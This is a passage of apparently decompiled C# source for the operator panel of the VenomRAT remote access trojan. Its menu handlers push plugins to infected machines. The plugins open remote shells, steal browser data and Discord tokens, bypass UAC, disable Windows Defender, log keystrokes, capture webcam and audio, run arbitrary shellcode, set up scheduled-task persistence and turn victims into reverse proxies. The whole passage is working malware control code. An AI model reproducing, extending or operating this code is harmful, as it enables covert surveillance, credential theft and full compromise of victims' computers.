					string value = jObject2[key].ToString();
					list.Add(new GrabItem
					{
						category = key,
						value = value
					});
				}
			}
			gridControlGraber.DataSource = list;
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg(ex.Message, Color.Blue);
		}
	}

	private void listViewGrabClients_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (listViewGrabClients.SelectedItems.Count != 0)
		{
			string text = (string)listViewGrabClients.SelectedItem;
			string path = "ClientsFolder\\" + text + "\\VenomStealer\\Logs.txt";
			if (File.Exists(path))
			{
				LoadJson(File.ReadAllText(path));
			}
		}
	}

	private void initallpluginmenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "init_reg";
		foreach (Clients selectedClient in SelectedClients)
		{
			ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
		}
	}

	public void GroupClients(GROUP_TYPE _tp)
	{
		gridViewClient.ClearGrouping();
		Settings.groupby = _tp;
		switch (_tp)
		{
		case GROUP_TYPE.LOCATION:
			CountryColumn.Group();
			break;
		case GROUP_TYPE.OS:
			OSColumn.Group();
			break;
		case GROUP_TYPE.DEFENDER:
			AVColumn.Group();
			break;
		case GROUP_TYPE.NOTE:
			NoteColumn.Group();
			break;
		}
		gridViewClient.ExpandAllGroups();
	}

	private void groupbydefaultmenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		GroupClients(GROUP_TYPE.NONE);
	}

	private void groupByLocationMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		GroupClients(GROUP_TYPE.LOCATION);
	}

	private void GroupByOSMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		GroupClients(GROUP_TYPE.OS);
	}

	private void GroupbyAntivirusMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		GroupClients(GROUP_TYPE.DEFENDER);
	}

	private void GroupByNoteMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		GroupClients(GROUP_TYPE.NOTE);
	}

	private void RemoteShellMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "shell";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormShell)Application.OpenForms["shell:" + selectedClient.ID] == null)
				{
					FormShell formShell = new FormShell();
					formShell.Name = "shell:" + selectedClient.ID;
					formShell.Text = "Remote Shell on " + selectedClient.info.desktopname;
					formShell.F = this;
					formShell.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void AddNoteMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		FormInputString formInputString = new FormInputString();
		if (formInputString.ShowDialog() == DialogResult.OK)
		{
			string note = formInputString.note;
			if (!string.IsNullOrEmpty(note) && SelectedClient != null)
			{
				SelectedClient.info.note = note;
				SelectedClient.SaveInfo();
				UpdateClientGrid();
			}
		}
	}

	private void LoadAnalyzedInfoMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "report";
		msgPack.ForcePathObject("discordurl").AsString = Server.Properties.Settings.Default.DiscordUrl;
		MsgPack msgPack2 = new MsgPack();
		msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
		msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Stealer.dll");
		msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
		foreach (Clients selectedClient in SelectedClients)
		{
			ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			new HandleLogs().Addmsg("Fetching Web Data From " + selectedClient.Ip + "...", Color.Black);
		}
	}

	private void ChangeBackMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
			msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
			msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ClientFolderMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (SelectedClient == null)
			{
				Process.Start(Application.StartupPath);
				return;
			}
			string obj = Path.Combine(Application.StartupPath, "ClientsFolder", SelectedClient.Ip);
			Directory.CreateDirectory(obj);
			Process.Start(obj);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void CompLauncherMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if (!selectedClient.IsAdmin)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableRecoveryMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Discord.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
			}
			new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableUACMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if (selectedClient.IsAdmin)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableWDMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if (selectedClient.IsAdmin)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FileManagerMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormFileManager)Application.OpenForms["fileManager:" + selectedClient.ID] == null)
				{
					FormFileManager formFileManager = new FormFileManager();
					formFileManager.Name = "fileManager:" + selectedClient.ID;
					formFileManager.Text = "Remote FileManager on " + selectedClient.info.desktopname;
					formFileManager.F = this;
					formFileManager.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID);
					formFileManager.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FileSearcherMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		using FormFileSearcher formFileSearcher = new FormFileSearcher();
		if (formFileSearcher.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
		msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000 * 1000;
		msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
		MsgPack msgPack2 = new MsgPack();
		msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
		msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
		msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
		foreach (Clients selectedClient in SelectedClients)
		{
			ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
		}
	}

	private void FodHelperMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if (!selectedClient.IsAdmin)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FunMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Fun.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormFun)Application.OpenForms["fun:" + selectedClient.ID] == null)
				{
					FormFun formFun = new FormFun();
					formFun.Name = "fun:" + selectedClient.ID;
					formFun.Text = "Fun on " + selectedClient.info.desktopname;
					formFun.F = this;
					formFun.ParentClient = selectedClient;
					formFun.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void LoadGeneralInfoMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "information";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Information.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void KeyLogMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (SelectedClient != null)
		{
			FormTimerKeylog formTimerKeylog = new FormTimerKeylog();
			formTimerKeylog.MainClient = SelectedClient;
			formTimerKeylog.Name = SelectedClient.info.hwid + ":TimerKeylog";
			formTimerKeylog.ShowDialog();
		}
	}

	private void LoadKeyLogInfoMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		foreach (Clients selectedClient in SelectedClients)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "loadofflinelog";
			ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
		}
	}

	private void LogoutSystemMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "logoff";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SendMessageBoxMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Message", "Message", "Controlled by VenomRAT");
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
			msgPack.ForcePathObject("Message").AsString = text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void NetstatMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Netstat.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormNetstat)Application.OpenForms["Netstat:" + selectedClient.ID] == null)
				{
					FormNetstat formNetstat = new FormNetstat();
					formNetstat.Name = "Netstat:" + selectedClient.ID;
					formNetstat.Text = "Netstat on " + selectedClient.info.desktopname;
					formNetstat.F = this;
					formNetstat.ParentClient = selectedClient;
					formNetstat.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void NormalInstallStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void NormalUnInstallStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void NoSystemStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "nosystem";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if (selectedClient.IsAdmin)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ProcManagerMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormProcessManager)Application.OpenForms["processManager:" + selectedClient.ID] == null)
				{
					FormProcessManager formProcessManager = new FormProcessManager();
					formProcessManager.Name = "processManager:" + selectedClient.ID;
					formProcessManager.Text = "ProcessManager on " + selectedClient.info.desktopname;
					formProcessManager.F = this;
					formProcessManager.ParentClient = selectedClient;
					formProcessManager.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RecordMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormAudio)Application.OpenForms["Audio Recorder:" + selectedClient.ID] == null)
				{
					FormAudio formAudio = new FormAudio();
					formAudio.Name = "Audio Recorder:" + selectedClient.ID;
					formAudio.Text = "Audio Recorder on " + selectedClient.info.desktopname;
					formAudio.F = this;
					formAudio.ParentClient = selectedClient;
					formAudio.Client = selectedClient;
					formAudio.Show();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void LoadRecoveryInfoMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
		string checksum = GetHash.GetChecksum("Plugins\\Recovery.dll");
		msgPack.ForcePathObject("Dll").AsString = checksum;
		foreach (Clients selectedClient in SelectedClients)
		{
			ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
			new HandleLogs().Addmsg("Fetching Web Data From " + selectedClient.Ip + "...", Color.Black);
		}
	}

	private void RegEditMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Regedit.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + selectedClient.ID] == null)
				{
					FormRegistryEditor formRegistryEditor = new FormRegistryEditor();
					formRegistryEditor.Name = "remoteRegedit:" + selectedClient.ID;
					formRegistryEditor.Text = "Remote Registry on " + selectedClient.info.desktopname;
					formRegistryEditor.ParentClient = selectedClient;
					formRegistryEditor.F = this;
					formRegistryEditor.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RemoteCameraMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormWebcam)Application.OpenForms["Webcam:" + selectedClient.ID] == null)
				{
					FormWebcam formWebcam = new FormWebcam();
					formWebcam.Name = "Webcam:" + selectedClient.ID;
					formWebcam.F = this;
					formWebcam.Text = "WebCamera on " + selectedClient.info.desktopname;
					formWebcam.ParentClient = selectedClient;
					formWebcam.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID, "Camera");
					formWebcam.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RemoteDesktopMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
			foreach (Clients selectedClient in SelectedClients)
			{
				if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + selectedClient.ID] == null)
				{
					FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop();
					formRemoteDesktop.Name = "RemoteDesktop:" + selectedClient.ID;
					formRemoteDesktop.F = this;
					formRemoteDesktop.Text = "Remote Desktop on " + selectedClient.info.desktopname;
					formRemoteDesktop.ParentClient = selectedClient;
					formRemoteDesktop.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID, "RemoteDesktop");
					formRemoteDesktop.Show();
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RestartStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RestartSystemMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ReverseProxyMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
		msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ReverseProxy.dll");
		ThreadPool.QueueUserWorkItem(SelectedClient.Send, msgPack.Encode2Bytes());
		new HandleLogs().Addmsg("Setting " + SelectedClient.Ip + " as Reverse Proxy...", Color.Blue);
	}

	private void RunAsMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uac";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if (!selectedClient.IsAdmin)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RunShellCodeMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = false;
			openFileDialog.Filter = "(*.bin)|*.bin";
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Shellcode";
			msgPack.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SchTaskInstallStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SchTaskUnInstallStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void GotoSettingMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		new FormSetting().ShowDialog();
	}

	private void ShutDownMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "shutdown";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void CleanUpMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
